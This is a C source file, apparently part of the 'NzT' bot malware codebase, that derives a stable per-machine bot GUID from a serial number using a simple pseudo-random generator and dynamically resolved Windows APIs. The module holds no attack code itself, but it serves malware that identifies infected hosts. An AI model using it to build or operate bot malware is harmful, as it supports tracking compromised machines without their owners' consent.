#include "nzt.h"
#include "guid.h"
#include "crt.h"
#include "utils.h"

static DWORD GuidRandom(PDWORD Seed)
{
	return(*Seed = 1664525 * (*Seed));
}

VOID GuidGenerate(
	GUID * Guid,
	PDWORD Seed
)
{
	Guid->Data1 = GuidRandom(Seed);
	Guid->Data2 = (DWORD)GuidRandom(Seed);
	Guid->Data3 = (DWORD)GuidRandom(Seed);

	for (DWORD i = 0; i < 8; i++)
		Guid->Data4[i] = (UCHAR)GuidRandom(Seed);
}

LPTSTR GuidGenerateEx(PDWORD Seed)
{
	ULONG	Length				= GUID_STR_LENGTH + 1;
	LPTSTR	GuidString, Name	= NULL;
	GUID	Guid;

	GuidGenerate(&Guid, Seed);
	if (GuidString = GuidToString(&Guid))
	{
		if (Name = (LPTSTR)Malloc(Length * sizeof(TCHAR)))
		{
			Name[0] = 0;
			StringConcatA(&Name, GuidString);
		}

		Free(GuidString);
	}

	return (Name);
}

VOID GuidFillName(
	PDWORD Seed,
	LPTSTR GuidName
)
{
	GUID	Guid;
	ULONG	Size = 0;

	GuidGenerate(&Guid, Seed);
	Size = NzT.Api.pwsprintfA(GuidName, GUID_STR_FORMAT, Guid.Data1, Guid.Data2, Guid.Data3, *(PDWORD)&Guid.Data4[0], *(PDWORD)&Guid.Data4[2], *(PDWORD)&Guid.Data4[6]);
}

ULONG GuidToBuffer(
	GUID*	Guid,
	LPTSTR	Buffer
)
{
	return (NzT.Api.pwsprintfA(Buffer, GUID_STR_FORMAT, htonS(Guid->Data1), htonS(Guid->Data2), htonS(Guid->Data3), htonS(*(PDWORD)&Guid->Data4[0]),
		htonL(*(PDWORD)&Guid->Data4[2]), htonS(*(PDWORD)&Guid->Data4[6])));
}

LPTSTR GuidToString(GUID *Guid)
{
	LPTSTR String = NULL;

	if (String = (LPTSTR)Malloc((GUID_STR_LENGTH + 1) * sizeof(TCHAR)))
		GuidToBuffer(Guid, String);

	return (String);
}

LPTSTR GetBotGuid()
{
	return GuidGenerateEx(GetSerialNumber());
}